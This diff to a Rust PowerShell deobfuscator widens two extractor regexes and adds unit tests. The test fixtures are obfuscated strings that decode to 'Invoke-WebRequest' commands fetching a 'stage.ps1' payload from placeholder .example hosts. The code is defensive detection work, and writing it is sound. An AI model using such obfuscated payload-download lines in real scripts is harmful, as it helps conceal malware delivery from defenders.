@@ -954,7 +954,7 @@ static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*-(?:[ic])?replace\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?replace\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
     )
     .expect("ps literal replace extractor body regex")
 });
@@ -986,7 +986,7 @@ static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*-(?:[ic])?split\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
+        r#"(?is)(?:\breturn\s+)?\(?\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?split\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
     )
     .expect("ps literal split operator index extractor body regex")
 });
@@ -6584,6 +6584,23 @@ Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p
     }
 
     #[test]
+    fn literal_parenthesized_lhs_replace_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$needle,$replacement) {
+  return ($value) -replace $needle,$replacement
+}
+Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~p~a~r~e~n~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;
+
+        let out = expand_literal_replace_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-paren-replace-extractor.example/stage.ps1'"
+            ),
+            "parenthesized-lhs replace extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
     fn literal_parenthesized_receiver_dot_replace_extractor_call_is_rewritten() {
         let text = r#"function Clean($value,$needle,$replacement) {
   return ($value).Replace($needle,$replacement)
@@ -6741,6 +6758,23 @@ Piece 'noise|Invoke-WebRequest -Uri https://ps-split-operator.example/stage.ps1|
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-split-operator.example/stage.ps1'"),
             "split-operator extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_parenthesized_lhs_split_operator_index_extractor_call_is_rewritten() {
+        let text = r#"function Piece($value,$sep,$index) {
+  return (($value) -split $sep)[$index]
+}
+Piece 'noise|Invoke-WebRequest -Uri https://ps-paren-split-operator.example/stage.ps1|tail' '|' 1"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-paren-split-operator.example/stage.ps1'"
+            ),
+            "parenthesized-lhs split-operator extractor call was not rewritten:\n{out}"
         );
     }
 
